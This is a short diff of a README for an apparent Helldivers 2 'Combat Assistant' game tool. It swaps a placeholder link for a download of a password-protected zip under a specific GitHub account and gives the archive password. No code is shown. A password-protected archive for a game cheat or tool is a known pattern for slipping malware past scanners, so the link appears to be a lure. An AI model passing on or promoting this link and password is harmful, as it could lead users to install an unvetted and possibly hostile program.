@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Helldivers-2-Combat-Assistant/releases/latest/download/Helldivers2-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/davegarcia-ops1901w4/Helldivers-2-Combat-Assistant/releases/download/download/Helldivers2_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
